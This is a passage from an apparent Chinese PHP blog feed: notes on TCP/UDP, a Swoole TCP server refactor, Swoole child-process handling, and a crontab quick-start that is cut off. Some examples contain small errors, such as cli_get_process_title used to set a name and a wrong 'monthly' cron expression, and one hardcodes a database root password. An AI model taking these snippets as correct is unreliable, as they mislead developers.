0:0:0:0) 表示监听所有地址</p><h3 id="TCP-协议"><a href="#TCP-协议" class="headerlink" title="TCP 协议"></a>TCP 协议</h3><p>TCP (Transmission Control Protocol 传输控制协议）协议是一种面向连接的，可靠的，基于字节流的传输通信协议。</p><h3 id="UDP-协议"><a href="#UDP-协议" class="headerlink" title="UDP 协议"></a>UDP 协议</h3><p>UDP (User Datagram Protocol 用户数据报协议）是一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</p><p>UDP 服务器与 TCP 服务器不同，UDP 没有连接的概念。启动 Server 后，客户端无需 Connect，直接可以向 Server 监听的 9502 端口发送数据包。</p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="TCP-“粘包”问题"><a href="#TCP-“粘包”问题" class="headerlink" title="TCP “粘包”问题"></a>TCP “粘包”问题</h3><p>首先来解释以下所谓的“粘包”问题其本质是什么。</p><p>服务端建立服务，客户端向服务端发起连接，正常情况下，服务端的每次 send，客户端都能正常 recv。但在并发的情况下，服务端的两次send 或者更多次 sned，客户端可能一次就 recv了。</p><p>所以这就导致“粘包”问题的产生。</p><p>TCP 协议的本质是流协议，它只会保证保证发送方以什么顺序发送字节，接收方就一定能按这个顺序接收到。所以所谓的“粘包”问题不应该是传输层的问题，而是应用层的问题。</p><h3 id="无法连接到服务器的简单检测手段"><a href="#无法连接到服务器的简单检测手段" class="headerlink" title="无法连接到服务器的简单检测手段"></a>无法连接到服务器的简单检测手段</h3><ol><li>在 Linux 下，使用 <code>netstat -an | grep</code> 端口，查看端口是否已经被打开处于 Listening 状态</li><li>上一步确认后，再检查防火墙问题，这里的防火墙指的是机器本身的防火墙，如果是云服务器，那么还包括云的防火墙。</li><li>注意服务器所使用的 IP 地址，如果是 <code>127.0.0.1</code> 回环地址，则客户端只能使用 <code>127.0.0.1</code> 才能连接上，所以如果希望其他机器也能访问本机，那就使用<code>0.0.0.0</code>。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.zhihu.com/question/20210025" target="_blank" rel="noopener">怎么解决TCP网络传输「粘包」问题？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来记录Swoole 基础知识的学习。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Swoole" scheme="https://www.0x2beace.com/tags/Swoole/"/>
    
  </entry>
  
  <entry>
    <title>Swoole Tcp 学习</title>
    <link href="https://www.0x2beace.com/swoole-tcp-learning/"/>
    <id>https://www.0x2beace.com/swoole-tcp-learning/</id>
    <published>2020-11-02T15:22:49.000Z</published>
    <updated>2020-11-02T15:40:47.308Z</updated>
    
    <content type="html"><![CDATA[<p>最近一直在学习Swoole，刚好有个老项目的一小部分(一个脚本)有用到了Tcp 协议，借此机会重构一下。</p><a id="more"></a><h3 id="场景描述："><a href="#场景描述：" class="headerlink" title="场景描述："></a>场景描述：</h3><p>该脚本的作用用一句话就可以概述：将本地数据源推送给另外一台服务器。</p><p>原始的处理方式，不合理的地方有以下几点：</p><ol><li>目标服务器需要开放指定端口，这会导致目标服务器向外暴露，不安全。</li><li>如果有多台目标服务器，这会导致频繁需要修改源码，脚本维护起来不方便。</li></ol><h3 id="重构"><a href="#重构" class="headerlink" title="重构"></a>重构</h3><p>重构需要解决的问题有如下：</p><ol><li>当客户端连接成功后，才会向该客户端推送数据。</li><li>当客户端断开连接时，停止向该客户端推送数据。</li><li>允许多个客户端同时连接。</li><li>因为数据源是不间断的，理论上只要客户端的连接不主动断开，服务端的数据推送就不会主动停止。</li></ol><p>最终使用Swoole 的Tcp + Process 实现了以上需求，核心代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">use Swoole\Process;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 创建Server 对象，监听本地 9501 端口。</span><br><span class="line"> *&#x2F;</span><br><span class="line">$server &#x3D; new Swoole\Server(&quot;0.0.0.0&quot;, 9501);</span><br><span class="line"></span><br><span class="line">$workers &#x3D; [];</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听连接进入事件</span><br><span class="line"> *&#x2F;</span><br><span class="line">$server-&gt;on(&quot;Connect&quot;, function ($server, $fd) &#123;</span><br><span class="line">global $workers;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建子进程</span><br><span class="line">$process &#x3D; new swoole_process(function (swoole_process $worker) use ($server, $fd) &#123;</span><br><span class="line">echo &quot;Client Connect&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; todo 业务逻辑</span><br><span class="line">  ...</span><br><span class="line">   </span><br><span class="line">  &#x2F;&#x2F; 向客户端推送消息   </span><br><span class="line">  $server-&gt;send($fd, $str);</span><br><span class="line">  </span><br><span class="line">&#125;, true, 0, false);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启动子进程</span><br><span class="line">$pid &#x3D; $process-&gt;start();</span><br><span class="line"></span><br><span class="line">array_push($workers, [&quot;pid&quot; &#x3D;&gt; $pid, &quot;fd&quot; &#x3D;&gt; $fd]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听数据接收事件</span><br><span class="line"> *&#x2F;</span><br><span class="line">$server-&gt;on(&quot;Receive&quot;, function ($server, $fd, $from_id, $data)&#123;</span><br><span class="line">$server-&gt;send($fd, &quot;Server: &quot; . $data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听连接关闭事件</span><br><span class="line"> *&#x2F;</span><br><span class="line">$server-&gt;on(&quot;Close&quot;, function ($server, $fd) &#123;</span><br><span class="line">global $workers;</span><br><span class="line"></span><br><span class="line">foreach ($workers as $worker) &#123;</span><br><span class="line">  if ($worker[&#39;fd&#39;] &#x3D;&#x3D;&#x3D; $fd)&#123;</span><br><span class="line">    &#x2F;&#x2F; 检查子进程是否存在</span><br><span class="line">  if (Process::kill($worker[&#39;pid&#39;], 0))&#123;</span><br><span class="line">  array_shift($worker);</span><br><span class="line">  &#x2F;&#x2F; 通过信号终止子进程</span><br><span class="line">  Process::kill($worker[&#39;pid&#39;], SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Client Close&quot; . PHP_EOL;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启动TCP 服务器</span><br><span class="line">$server-&gt;start();</span><br></pre></td></tr></table></figure><p>其实实现的原理很简单，利用Swoole 的基于事件的 Tcp 异步编程，当有客户端连接时，就创建一个子进程进行推送数据，但客户端连接断开时，就通过信号结束该客户端对应的子进程。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近一直在学习Swoole，刚好有个老项目的一小部分(一个脚本)有用到了Tcp 协议，借此机会重构一下。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Swoole" scheme="https://www.0x2beace.com/tags/Swoole/"/>
    
  </entry>
  
  <entry>
    <title>Swoole 进程学习</title>
    <link href="https://www.0x2beace.com/swoole-process-learning/"/>
    <id>https://www.0x2beace.com/swoole-process-learning/</id>
    <published>2020-11-01T12:53:56.000Z</published>
    <updated>2020-11-03T14:33:18.115Z</updated>
    
    <content type="html"><![CDATA[<p>记录Swoole 进程学习过程。</p><a id="more"></a><h3 id="1-创建一个进程"><a href="#1-创建一个进程" class="headerlink" title="1. 创建一个进程"></a>1. 创建一个进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;  获取当前进程 ID</span><br><span class="line">echo &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 为进程设置名称</span><br><span class="line">cli_get_process_title(&quot;Master&quot;);</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-创建一个子进程，如何回收子进程。"><a href="#2-创建一个子进程，如何回收子进程。" class="headerlink" title="2. 创建一个子进程，如何回收子进程。"></a>2. 创建一个子进程，如何回收子进程。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;  获取当前进程 ID</span><br><span class="line">echo &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 为进程设置名称</span><br><span class="line">cli_get_process_title(&quot;Master&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建一个子进程</span><br><span class="line">$child &#x3D; new \Swoole\Process(function ()&#123;</span><br><span class="line">cli_get_process_title(&quot;Child&quot;);</span><br><span class="line">&#x2F;&#x2F; 这是一个匿名函数，也就是定义子进程需要做的事情。</span><br><span class="line">echo &quot;我是一个子进程，我的ID 是：&quot; . posix_getpid() . PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 如果就这样放着不管，那么这个子进程不会被回收，它是一个僵尸进程，虽然在那里但是并没有做事情，它的生命周期已经结束了。</span><br><span class="line">&#125;);</span><br><span class="line">&#x2F;&#x2F; 创建</span><br><span class="line">$child-&gt;start();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 回收子进程</span><br><span class="line">\Swoole\Process::wait();</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-重定向子进程标准输出"><a href="#3-重定向子进程标准输出" class="headerlink" title="3. 重定向子进程标准输出"></a>3. 重定向子进程标准输出</h3><p>子进程默认的标准输出是输出到屏幕上，可以通过对子进程设置，把输出重定向至管道。</p><p>然后再由主进程把管道中的内容读取出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;  获取当前进程 ID</span><br><span class="line">echo &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 为进程设置名称</span><br><span class="line">cli_get_process_title(&quot;Master&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建一个子进程</span><br><span class="line">$child &#x3D; new \Swoole\Process(function ()&#123;</span><br><span class="line">cli_get_process_title(&quot;Child&quot;);</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">&#x2F;&#x2F; 这是一个匿名函数，也就是定义子进程需要做的事情。</span><br><span class="line">echo &quot;我是一个子进程，我的ID 是：&quot; . posix_getpid() . PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 如果就这样放着不管，那么这个子进程不会被回收，它是一个僵尸进程，虽然在那里但是并没有做事情，它的生命周期已经结束了。</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;, true);</span><br><span class="line">&#x2F;&#x2F; 创建</span><br><span class="line">$child-&gt;start();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 回收子进程，是否阻塞等待，默认为true，阻塞。</span><br><span class="line">\Swoole\Process::wait(false);</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">echo &quot;通过主进程从管道中读取信息：&quot;. $child-&gt;read(). PHP_EOL;</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样做的好处是，可以通过主进程集中处理子进程的输出（比如可以写入日志），避免输出直接到屏幕中了。</p><p>第一个参数的作用是：是否将输出重定向至主进程。<br>true：将输出重定向至主进程管道。<br>false：直接将输出重定向至屏幕。</p><p>第二个参数的作用是：是否创建管道。<br>0：不创建</p><ol><li>创建Tcp 管道</li><li>创建Udp 管道</li></ol><p>第三个参数的作用是：是否启用协程。</p><h3 id="4-多个子进程的回收"><a href="#4-多个子进程的回收" class="headerlink" title="4. 多个子进程的回收"></a>4. 多个子进程的回收</h3><p>如果主进程只是执行一次就退出，而子进程还一直在，那么主进程也不会直接退出。</p><p>如果有多个子进程，其中某一个子进程退出了，而另一个并没有退出，这时主进程也会选择退出，而剩余的那个子进程则成了僵尸进程。<br>因为它的父进程的ID 为零。</p><p>如果不做信号处理，否则子进程一旦退出，都会引起父进程退出。如果这时还有其他子进程没有退出，这会造成其他子进程变成僵尸进程。   </p><ol start="5"><li>在子进程中创建服务</li></ol><p>分别是Master、Manager、Worker 进程，以及该子进程的父进程。</p><p>可以单独设置http 进程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$http-&gt;set([</span><br><span class="line">  &quot;worker_num&quot; &#x3D;&gt; 1</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>这样的话，进程就变成了两类：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201101204306.png" alt=""></p><p>最上面那个是父进程，下面三个分别是Master、Manger、Worker 进程。</p><h3 id="6-在进程中使用协程"><a href="#6-在进程中使用协程" class="headerlink" title="6. 在进程中使用协程"></a>6. 在进程中使用协程</h3><h3 id="7-子进程使用管道进行通信"><a href="#7-子进程使用管道进行通信" class="headerlink" title="7. 子进程使用管道进行通信"></a>7. 子进程使用管道进行通信</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">use \Swoole\Process;</span><br><span class="line">&#x2F;&#x2F;  引入协程</span><br><span class="line">use \Swoole\Coroutine\Mysql as Mysql;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;  获取当前进程 ID</span><br><span class="line">echo &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;</span><br><span class="line"></span><br><span class="line">$child &#x3D; new Process(function (Process $proces)&#123;</span><br><span class="line">&#x2F;&#x2F; $mysql &#x3D; new \think\db\builder\Mysql();</span><br><span class="line">$mysql &#x3D; new Mysql();</span><br><span class="line">$db &#x3D; $mysql-&gt;connect([&quot;host&quot; &#x3D;&gt; &quot;127.0.0.1&quot;, &quot;user&quot; &#x3D;&gt; &quot;root&quot;, &quot;password&quot; &#x3D;&gt; &quot;122410&quot;, &quot;database&quot; &#x3D;&gt; &quot;2v&quot;]);</span><br><span class="line">while (true) &#123;</span><br><span class="line">$sql &#x3D; &quot;select * from 2v.2v_user where is_delete &#x3D; 0 limit 0, 1&quot;;</span><br><span class="line">$rows &#x3D; $mysql-&gt;query($sql);</span><br><span class="line">if ($rows) &#123;</span><br><span class="line">$proces-&gt;write(&quot;我是一号子进程，正在查询数据：&quot;.$rows[0][&quot;user_name&quot;]);</span><br><span class="line">&#125;</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;, false, 1, true);</span><br><span class="line">&#x2F;&#x2F; 创建子进程</span><br><span class="line">$child-&gt;start();</span><br><span class="line"></span><br><span class="line">$child2 &#x3D; new Process(function (Process $process) &#123;</span><br><span class="line">while (true) &#123;</span><br><span class="line">sleep(1);</span><br><span class="line">$res &#x3D; $process-&gt;read();</span><br><span class="line">if ($res) &#123;</span><br><span class="line">echo &quot;我是二号子进程，正在获取数据：&quot;.$res.PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#x2F;&#x2F; 创建第二个子进程</span><br><span class="line">$child2-&gt;start();</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">&#x2F;&#x2F; 一号子进程从管道中读取数据</span><br><span class="line">$data &#x3D; $child-&gt;read();</span><br><span class="line">if ($data) &#123;</span><br><span class="line">&#x2F;&#x2F; 如果数据存在，二号子进程则向管道中写入数据</span><br><span class="line">$child2-&gt;write($data);</span><br><span class="line">&#125;</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 通过信号回收子进程</span><br><span class="line">Process::signal(SIGCHLD, function ($sig) &#123;</span><br><span class="line">&#x2F;&#x2F; 必须为false，非阻塞模式</span><br><span class="line">while ($res &#x3D; Process::wait(false)) &#123;</span><br><span class="line">echo &quot;PID &#x3D; &#123;$res[&#39;pid&#39;]&#125;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="8-子进程使用队列进行通信"><a href="#8-子进程使用队列进行通信" class="headerlink" title="8. 子进程使用队列进行通信"></a>8. 子进程使用队列进行通信</h3><h3 id="9-设置定时任务"><a href="#9-设置定时任务" class="headerlink" title="9. 设置定时任务"></a>9. 设置定时任务</h3><p>通过Swoole 设置定时任务，到点之后自动执行定时任务。</p><p>核心逻辑：创建一个Manager 进程，通过一个while 循环，定时获取获取当前时间判断是否需要执行定时任务。</p><p>如果需要执行定时任务，则发送一个信号，在主进程中监听该信号， 然后执行对应的业务逻辑。</p><p>从 Swoole 4.x 版本开始，不再以监听信号的方式作为回收子进程了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录Swoole 进程学习过程。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Swoole" scheme="https://www.0x2beace.com/tags/Swoole/"/>
    
  </entry>
  
  <entry>
    <title>Crontab 快速上手</title>
    <link href="https://www.0x2beace.com/crontab-quick-start/"/>
    <id>https://www.0x2beace.com/crontab-quick-start/</id>
    <published>2020-10-27T15:22:29.000Z</published>
    <updated>2020-11-20T15:09:20.436Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://zh.wikipedia.org/zh-hans/Cron" target="_blank" rel="noopener">Crontab</a> 是Unix 系统中基于时间的任务管理工具。</p><a id="more"></a><p>这个命令与传统的 Unix 命令不一样，下面会一一介绍其规则及其用法。</p><h2 id="crontab-还是-cron"><a href="#crontab-还是-cron" class="headerlink" title="crontab 还是 cron"></a>crontab 还是 cron</h2><p><a href="https://baike.baidu.com/item/crontab" target="_blank" rel="noopener">crontab</a> 还是 <a href="https://baike.baidu.com/item/cron" target="_blank" rel="noopener">cron</a>？初次接触 crontab 的同学可能会被这两个词给绕晕。</p><p>其实可以这样来理解：<code>crontab</code>就是 <code>cron</code>服务的命令行工具，而<code>cron</code>则是背后处理<code>crontab</code>投递任务的服务。</p><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><p>crontab 命令是以固定的时间格式来使用的，</p><table><thead><tr><th>表示意义</th><th>分钟</th><th>小时</th><th>日期</th><th>月份</th><th>周</th><th>命令</th></tr></thead><tbody><tr><td>范围</td><td>0～59（*）</td><td>0～23（*）</td><td>1～31（*）</td><td>1～12（*）</td><td>0～7（*）</td><td>需要执行的命令</td></tr></tbody></table><p>另外还有一些特殊字符具有特殊含义：</p><ul><li><code>*</code> 表示任何时刻都接收。举个栗子：<code>* 12 * * *</code> 表示不论何月、何日的星期几的十二点都执行指定命令。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201027163458.png" alt=""></p><h3 id="常用实例"><a href="#常用实例" class="headerlink" title="常用实例"></a>常用实例</h3><p>每分钟执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * 或者 * * * * *</span><br></pre></td></tr></table></figure><p>每五分钟执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;5 * * * *</span><br></pre></td></tr></table></figure><p>每小时执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 * * * *  或者 0 *&#x2F;1 * * *</span><br></pre></td></tr></table></figure><p>每天执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 * *  *</span><br></pre></td></tr></table></figure><p>每周执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 * *  0</span><br></pre></td></tr></table></figure><p>每月执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 1 *  0</span><br></pre></td></tr></table></figure><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p>初次接触<code>crontab</code> 命令时，我也比较纳闷，这个命令倒底是如何使用的？</p><p>使用 crontab 有两种方式：</p><ol><li>crontab -e：直接接受标准输入（键盘）上键入的命令，并将它们载入crontab。</li><li>crontab file：将file 作为crontab 的任务列表文件并载入crontab</li></ol><p>第一种方式没什么好说的，直接在终端添加 crontab 任务就行了，下面简单说一下第二种（其实两者的核心都是一样的）。</p><h4 id="创建crontab-文件"><a href="#创建crontab-文件" class="headerlink" title="创建crontab 文件"></a>创建crontab 文件</h4><p>首先创建一个文件，该文件的内容以<strong>功能描述</strong>、<strong>执行时间</strong>、<strong>执行任务</strong> 这几部分组成。</p><p>其中，前两者并不是一定需要，只是为了方便自己日后或其他人能快速知道这个任务具体是做什么的，<code>#</code> 表示注释。</p><p>示例，创建一个名称为<code>script_cron</code> 的crontab 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 每分钟执行一次 script.php 脚本</span><br><span class="line">* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php</span><br></pre></td></tr></table></figure><h4 id="运行crontab"><a href="#运行crontab" class="headerlink" title="运行crontab"></a>运行crontab</h4><p>为了提交刚刚创建的crontab 文件，可以把这个新创建的文件名称作为<code>crontab</code>命令的参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab script_cron</span><br></pre></td></tr></table></figure><h4 id="列出cron-服务"><a href="#列出cron-服务" class="headerlink" title="列出cron 服务"></a>列出cron 服务</h4><p>使用<code>-l</code> 参数列出crontab文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -l</span><br><span class="line"># 每分钟执行一次 script.php 脚本</span><br><span class="line">* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php</span><br></pre></td></tr></table></figure><h4 id="编辑cron-服务"><a href="#编辑cron-服务" class="headerlink" title="编辑cron 服务"></a>编辑cron 服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -e</span><br></pre></td></tr></table></figure><h4 id="删除cron-服务"><a href="#删除cron-服务" class="headerlink" title="删除cron 服务"></a>删除cron 服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -r</span><br></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h4 id="crontab-没有立即生效"><a href="#crontab-没有立即生效" class="headerlink" title="crontab 没有立即生效"></a>crontab 没有立即生效</h4><p>新创建的cron 任务，不会马上执行，至少要过两分钟才执行。</p><p>如果希望能马上执行，可以重启 crontab 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Ubuntu：</span><br><span class="line">$ service cron restart    </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Centos</span><br><span class="line">$ service crond restart</span><br></pre></td></tr></table></figure><h4 id="crontab-压根没执行"><a href="#crontab-压根没执行" class="headerlink" title="crontab 压根没执行"></a>crontab 压根没执行</h4><p>有时候会遇到直接在命令行中可以执行任务，但是定时任务却怎么都不执行，</p><p>这时首先需要确认 cron 服务是否正常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Ubuntu：</span><br><span class="line">$ service cron status    </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Centos</span><br><span class="line">$ service crond status</span><br></pre></td></tr></table></figure><p>然后确认需要执行的任务是否包含路径，如果包含请使用全局路径。</p><p>最后重启 cron 服务，通常到这里就已经可以正常执行了，如果还不行，尝试引入环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php</span><br></pre></td></tr></table></figure><h4 id="crontab-无权限执行"><a href="#crontab-无权限执行" class="headerlink" title="crontab 无权限执行"></a>crontab 无权限执行</h4><p>需要注意的是crontab 任务的调度，只有 root 和任务所有者拥有权限。</p><p>如果想要编辑/查看/删除其他用户的任务，可以使用以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 